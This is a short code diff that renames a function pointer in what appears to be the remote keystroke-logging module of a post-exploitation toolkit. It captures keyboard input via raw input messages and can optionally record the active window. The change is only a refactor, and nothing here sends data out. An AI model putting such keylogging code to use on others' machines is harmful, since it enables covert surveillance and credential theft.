@@ -73,7 +73,7 @@ WCHAR g_active_image[MAX_PATH] = L"Logging started";
 WCHAR g_prev_active_image[MAX_PATH] = { 0 };
 
 // pointer to selected data collection function
-INT (*f_logkey)(UINT, USHORT, USHORT);
+INT (*gfn_log_key)(UINT, USHORT, USHORT);
 DWORD dwThreadId;
 
 /*
@@ -197,7 +197,7 @@ LRESULT CALLBACK ui_keyscan_wndproc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM l
 			if (buffer->header.dwType == RIM_TYPEKEYBOARD
 				&& buffer->data.keyboard.Message == WM_KEYDOWN)
 			{
-				if (f_logkey(buffer->data.keyboard.VKey, buffer->data.keyboard.MakeCode, buffer->data.keyboard.Flags) == -1)
+				if (gfn_log_key(buffer->data.keyboard.VKey, buffer->data.keyboard.MakeCode, buffer->data.keyboard.Flags) == -1)
 					DestroyWindow(hwnd);
 			}
 		}
@@ -229,10 +229,10 @@ DWORD request_ui_start_keyscan(Remote *remote, Packet *request)
 
   // set appropriate logging function
   if (track_active_window) {
-    f_logkey = &ui_log_key_actwin;
+    gfn_log_key = &ui_log_key_actwin;
   }
   else {
-    f_logkey = &ui_log_key;
+    gfn_log_key = &ui_log_key;
   }
 
 	if (tKeyScan) {
